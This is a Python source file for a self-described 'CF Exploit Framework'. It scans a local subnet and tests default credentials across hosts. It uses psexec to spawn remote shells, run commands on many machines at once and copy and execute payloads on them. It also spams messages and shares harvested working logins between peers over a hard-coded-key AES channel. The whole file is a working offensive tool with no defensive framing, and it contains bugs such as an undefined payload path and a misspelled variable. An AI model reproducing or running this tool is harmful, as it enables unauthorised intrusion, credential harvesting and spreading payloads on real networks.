import os
import time
import threading
from threading import *
import socket
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES

banner = '''
  /$$$$$$  /$$$$$$$$ /$$$$$$$$
 /$$__  $$| $$_____/| $$_____/
| $$  \__/| $$      | $$
| $$      | $$$$$   | $$$$$
| $$      | $$__/   | $$__/
| $$    $$| $$      | $$
|  $$$$$$/| $$$$$$$$| $$
 \______/ |________/|__/
                          '''
validCommands = ["scan", "scannames", "hosts", "credtest", "getcmd", "rexec", "rcpy", "msg", "add", "remove", "intel"]
validDesc = [
    "Run a ping scan to identify hosts on the network", "Run a scan to find all the hosts on the network using netbios name", "List all hosts stored on this device", "Test to see if default creds work", "Open a shell on a remote system (user / pass)", "Run a command on a single or a group of PCs (add default to use 'Default' list)", "rexec but copy and execute a file from this system", "Message a single or group of computers", "Add an IP to a list", "Remove an IP from a list",
    "View intel on a given IP"
]
validUsage = ["-", "-", "-", "credtest [username:password] [list name to save under]", "getcmd [ip] [username] [password]", "rexec [list name] [username:password] [command]", "rcpy [list name] [username:password] [payload name]", "msg [list name] [num times] ", "add [ip] [list]", "remove [ip] [list]", "intel [ip]"]

ipNames = []
customLists = []
exclude = [165, 130, 139, 171, 178, 153, 151, 176, 179, 144, 160, 174, 175, 166, 120, 125, 142, 167, 132]

completeFlags = []

intel = {"10.181.231.165": ["What a legend"]}
intelSources = ["127.0.0.1", "10.181.231.165", "10.181.231.130"]  #DELETE YOUR IP FROM THIS

#CRYPTO INIT, THESE GET CHANGED REGULARL
key = b'\xb4y\xbd\xa0\xf2,\x1f~\x03\xb3\xef<7\xc4\xca\xde'
iv = b'C\xab\x8ef!C_\x13\xf5\xa2Z\xa0\xdaM\x19('

#=============================================================================
#=============================================================================
#SERVER SIDE - HANDLE INCOMING CONNECTIONS AND DEAL WITH REQUESTS
#=============================================================================
#=============================================================================


def readData(filename, intswitch=False):
    f = open(filename, "r")
    lines = f.readlines()
    f.close()
    totalRet = []
    for line in lines:
        data = line.split("|")
        header = data[0]
        ret = []
        for x in range(1, len(data)):
            if intswitch:
                ret.append(int(data[x].replace('\n', "")))
            else:
                ret.append(data[x].replace('\n', ""))
        totalRet.append([header, ret])
    return totalRet


def writeData(filename, data):
    os.remove(filename)
    f = open(filename, "a")
    for item in data:
        writeString = ""
        writeString += item[0]
        for i in item[1]:
            writeString += "|" + str(i)
        writeString += "\n"
        f.write(writeString)
    f.close()


def checkFile(filename):
    try:
        f = open(filename, "r")
        f.readlines()
        f.close()
        return 1
    except:
        f = open(filename, "w")
        f.write("")
        f.close()
        return 0


def intelInit():
    global customLists
    global ipNames
    global intel

    intelPresent = checkFile("intel.txt")
    hostsPresent = checkFile("hosts.txt")
    if hostsPresent == False:
        ipNames.append("ips")
        customLists.append([])

    ipInfo = readData("hosts.txt", True)
    for item in ipInfo:
        ipNames.append(item[0])
        customLists.append(item[1])

    intelInfo = readData("intel.txt")
    for item in intelInfo:
        intel[item[0]] = item[1]


def intelWrite():
    global customLists
    global ipNames
    global intel

    ipInfo = []
    for x in range(0, len(ipNames)):
        ipInfo.append([ipNames[x], customLists[x]])
    writeData("hosts.txt", ipInfo)

    intelInfo = []
    for key in intel:
        intelInfo.append([key, intel[key]])
    writeData("intel.txt", intelInfo)


def AES_pad(data):
    if len(data) % 16 == 0:
        return data
    databytes = bytearray(data)
    padding_required = 15 - (len(databytes) % 16)
    databytes.extend(b'\x80')
    databytes.extend(b'\x00' * padding_required)
    return bytes(databytes)


def AES_unpad(data):
    if not data:
        return data

    data = data.rstrip(b'\x00')
    if data[-1] == 128:  # b'\x80'[0]:
        return data[:-1]
    else:
        return data


def encryptAES(data):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    data = AES_pad(data.encode())
    return cipher.encrypt(data)


def decryptAES(data):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    data = cipher.decrypt(data)
    return AES_unpad(data).decode()


def testCrypto():
    msg = "Testing times two twice"
    code = encryptAES(msg)
    decode1 = decryptAES(code)


testCrypto()


def serverT():
    serverSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = "0.0.0.0"
    port = 13370
    serverSock.bind((host, port))
    serverSock.listen(5)
    while True:
        try:
            clientsocket, address = serverSock.accept()
            client(clientsocket, address)
        except:
            pass


class client(Thread):
    global players

    def __init__(self, socket, address):
        Thread.__init__(self)
        self.localPC = None
        self.sock = socket
        self.addr = address
        self.start()

    def run(self):
        cmd = (self.sock.recv(1024).decode()).split("|")
        response = self.processRequest(cmd)
        self.sock.send(encryptAES(str(response)))

    def processRequest(self, cmd):
        global intel

        if cmd[0] == "update":
            host = cmd[1]
            info = cmd[2]
            if host in intel:
                if info not in intel[host]:
                    intel[host].append(info)
                    return "[+] Done"
                else:
                    return "[!] Already exists"
            else:
                intel[host] = [info]
                return "[+] Created record"

        if cmd[0] == "get":
            host = cmd[1]
            info = cmd[2]
            if host in intel:
                return "|".join(intel[host])
            else:
                return "No information available at this time"


#=============================================================================
#=============================================================================
#CLIENT SIDE - MAKE INFORMATION REQUESTS TO OTHER DEVICES RUNNING CFEF
#=============================================================================
#=============================================================================


def makeRequest(ip, port, type, subject, body):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    packet = (type + "|" + subject + "|" + body).encode()
    sock.send(packet)
    response = decryptAES(sock.recv(1024))
    sock.close()
    return response


def updateIntel(host, info, action="add"):
    global intel
    if action == "add":
        if host in intel:
            if info not in intel[host]:
                intel[host].append(info)
        else:
            intel[host] = [info]

        for comp in intelSources:
            makeRequest(comp, 13370, "update", host, info)
    if action == "remove":
        if host in intel:
            if info in intel[host]:
                intel[host].remove(info)

        for comp in intelSources:
            makeRequest(comp, 13370, "remove", host, info)


def menu():
    for line in banner:
        print(line, end="")
    print("\n[!] Type 'help' to see available commands, and 'usage' for syntax")

    while True:
        cmd = input("\n> ").split(" ")
        if cmd[0] == "help":
            print("\n[!] Available commands are:\n")
            for i in range(0, len(validCommands)):
                print("[+] " + validCommands[i] + " :: " + validDesc[i])
            print("\n[!] Type 'usage' for info on how to run the commands\n")

        if cmd[0] == "usage":
            print("\n[!] Usage is as follows:\n")
            for i in range(0, len(validCommands)):
                print("[+] " + validCommands[i] + " :: " + validUsage[i])
            print("")

        if cmd[0] == "getcmd":
            rconnect(cmd[1], cmd[2], cmd[3])

        if cmd[0] == "msg":
            targList = customLists[ipNames.index(cmd[1])]
            number = cmd[2]
            message = ""
            for x in range(3, len(cmd)):
                message += (cmd[x] + " ")
            rmsg(targList, message, number)

        if cmd[0] == "clear":
            os.system("cls")
            for line in banner:
                print(line, end="")
            print("\nCF EXPLOIT FRAMEWORK v0.2")

        if cmd[0] == "rexec":
            if len(cmd) == 4:
                targList = customLists[ipNames.index(cmd[1])]
                creds = cmd[2]
                command = cmd[3]
                rexec(targList, command, creds)

        if cmd[0] == "rcpy":
            if len(cmd) == 4:
                targList = customLists[ipNames.index(cmd[1])]
                creds = cmd[2]
                payload = cmd[3]
                rcpy(targList, payload, creds)

        if cmd[0] == "scan":
            rscan()

        if cmd[0] == "scannames":
            rscannames()

        if cmd[0] == "hosts":
            if len(customLists) > 0:
                print("\n[+] TARGETS " + str(customLists[0]).replace(" ", ""))
                for i in range(1, len(ipNames)):
                    print("[+] %s %s" % (ipNames[i], str(customLists[i])))
            else:
                print("\n[!] No hosts found, run scan to detect")

        if cmd[0] == "credtest":
            try:
                credTest(cmd[1], cmd[2])
            except:
                pass

        if cmd[0] == "remove":
            if len(cmd) == 3:
                if cmd[1] in ipNames:
                    targlist = customLists[ipNames.index(cmd[1])]
                    if cmd[2] in targList:
                        targList.remove(cmd[2])
                intelWrite()

        if cmd[0] == "add":
            if len(cmd) == 3:
                if cmd[2] in ipNames:
                    targlist = customLists[ipNames.index(cmd[2])]
                    if cmd[2] not in targlist:
                        targlist.append(int(cmd[1]))
                else:
                    customLists.append([int(cmd[1])])
                    ipNames.append(cmd[2])
                intelWrite()

        if cmd[0] == "intel":
            try:
                host = cmd[1]
                getintel(host)
            except:
                pass


def getintel(host):
    returnIntel = []
    print("\n[!] Showing information for %s\n|" % host)
    if host in intel:
        for item in intel[host]:
            returnIntel.append(item)
            print("|----[+] %s" % item)
            pass
    for comp in intelSources:
        info = makeRequest(comp, 13370, "get", host, "")
        info = info.split("|")
        for item in info:
            if item not in returnIntel:
                returnIntel.append(item)
                print("|----[+] %s" % item)


def rconnect(target, uname, pword):
    print("\n[+] Spawning shell\n")
    os.system(r"C:\Users\Admin\psexec\psexec -nobanner \\10.181.231.%s -u %s -p %s cmd.exe" % (target, uname, pword))  #CHANGE TO WHEREVER PSEXEC IS


def credTest(creds="Profile:password", iplist="default"):
    global completeFlags
    global customLists
    global ipNames
    username = creds.split(":")[0]
    password = creds.split(":")[1]
    listIndex = 0
    if iplist not in ipNames:
        ipNames.append(iplist)
        customLists.append([])
    listIndex = ipNames.index(iplist)

    completeFlags = []
    index = 0
    for i in customLists[0]:
        completeFlags.append(0)
        x = threading.Thread(target=rexecT, args=(i, username, password, "hostname", index, True, listIndex))
        x.start()
        index += 1
    while 0 in completeFlags:
        pass
    customLists[listIndex].sort()
    os.system("cls")
    print("\n[+] Found %s devices with default credentials of %s" % (str(len(customLists[listIndex])), creds))
    print("[+] " + str(customLists[listIndex]).replace(" ", ""))
    intelWrite()


def rexec(targets, cmd, creds):
    global completeFlags
    completeFlags = []
    uname = creds.split(":")[0]
    password = creds.split(":")[1]
    index = 0
    for i in targets:
        completeFlags.append(0)
        x = threading.Thread(target=rexecT, args=(i, uname, password, cmd, index))
        x.start()
        time.sleep(.1)
        index += 1
    while 0 in completeFlags:
        pass
    print("\n[+] Done")


def rexecT(tgt=0, uname="", pword="", cmd="", index=0, sav=False, listIndex=0):  # The actual function for executing a command so that it can be threaded
    global completeFlags
    global customLists

    ending = tgt
    tgt = "10.181.231." + str(tgt)
    psexecString = r'C:\Users\Admin\psexec\psexec -nobanner \\%s -u %s -p %s cmd /k "%s && exit" 2> nul' % (tgt, uname, pword, cmd)
    resp = os.system(psexecString)
    if sav and tgt not in customLists[listIndex]:
        infostring = "LOGIN: " + uname + ":" + pword
        if str(resp) == "0":
            customLists[listIndex].append(ending)
            updateIntel(tgt, infostring)
        else:
            updateIntel(tgt, infostring, action="remove")

    completeFlags[index] = 1


def rcpy(targetList, payload, creds):
    global completeFlags
    global customLists
    completeFlags = []
    uname = creds.split(":")[0]
    password = creds.split(":")[1]
    index = 0
    for i in targetList:
        completeFlags.append(0)
        x = threading.Thread(target=rcpyT, args=(i, uname, passowrd, payload, index, False))
        x.start()
        time.sleep(.1)
        index += 1
    while 0 in completeFlags:
        pass
    print("\n[+] Done")


def rcpyT(tgt=0, uname="", pword="", fname="", index=0, onDesktop=False):  # The actual function for executing a command so that it can be threaded
    global completeFlags
    ending = tgt
    tgt = "10.181.231." + str(tgt)
    psexecString = ""
    if onDesktop == False:
        psexecString = r'C:\Users\Admin\psexec\psexec -nobanner \\%s -u %s -p %s -c %s\%s"' % (tgt, uname, pword, PATH_TO_PAYLOADS, fname)
    else:
        psexecString = r'C:\Users\Admin\psexec\psexec -nobanner \\%s -u %s -p %s -c "%s\%s"' % (tgt, uname, pword, PATH_TO_PAYLOADS, fname)
    resp = os.system(psexecString)
    completeFlags[index] = 1


def rscan():  # Conducts a ping scan to discover any hosts on the network
    global customLists
    customLists[0] = []
    for i in range(100, 240):
        ip = "10.181.231." + str(i)
        if os.system("ping -n 1 -w 100 " + ip) == 0:
            customLists[0].append(i)
    os.system("cls")
    print("\n==================================================")
    print("\n[+] HOST SCAN COMPLETE")
    print("\n[+] DISCOVERED: " + str(len(customLists[0])))
    print("\n[+] RANGE: " + str(customLists[0][0]) + " -> " + str(customLists[0][-1]))
    print("\n==================================================\n")
    intelWrite()


def rscannames():  # Conducts a scan of the netbios names to discover any hosts on the network
    global customLists
    customLists[0] = []
    for name in range(63):
        customLists[0].append(os.system(r"C:\Users\Admin\nbtscan " + "\"" + str(name) + "\""))
    os.system("cls")
    print("\n==================================================")
    print("\n[+] NAME SCAN COMPLETE")
    print("\n[+] DISCOVERED: " + str(len(customLists[0])))
    print("\n[+] RANGE: " + str(customLists[0][0]) + " -> " + str(customLists[0][-1]))
    print("\n==================================================\n")


def rmsg(targets, reason, num):
    maxThreads = 64
    print("")
    for t in range(0, num):
        for i in targets:
            target = "10.181.231." + str(i)
            x = threading.Thread(target=rmsgT, args=(reason, target))
            x.start()


def rmsgT(reason="", target=""):
    print("[+] MESSAGING:", target)
    os.system(r'msg Admin /SERVER %s %s' % (target, reason))


x = threading.Thread(target=serverT)
x.start()
intelInit()
menu()
